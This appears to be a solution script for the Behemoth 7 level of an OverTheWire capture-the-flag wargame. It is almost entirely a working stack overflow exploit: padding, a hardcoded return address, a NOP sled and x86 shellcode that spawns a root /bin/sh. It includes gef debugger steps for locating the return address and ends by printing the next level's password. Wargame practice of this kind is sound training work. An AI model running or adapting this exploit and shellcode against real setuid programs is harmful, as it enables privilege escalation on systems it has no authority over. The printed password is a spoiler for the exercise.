#!/bin/bash

./behemoth7 $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a'*512 +  b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

gef behemoth7
disassemble main
# find eip address -> 0x6e68520b
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a'*512 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# set eip address to bbbb
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a'*512 + b'a'*16 + b'b'*4 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

break *main+270
# find address of 'aaaa...' -> 0xffffd161
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a'*512 + b'a'*16 + b'b'*4 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# calculate address of shellcode -> 0xffffd161 + 512 + 16 + 4 = 0xffffd375
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a'*512 + b'a'*16 + b'\x75\xd3\xff\xff' + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# success in gef
quit

# add some \x90 before shellcode and wish it works
./behemoth7 $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'a'*512 + b'a'*16 + b'\x75\xd3\xff\xff' + b'\x90'*4096 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

cat /etc/behemoth_pass/behemoth8
# password: 8yWcelJd0D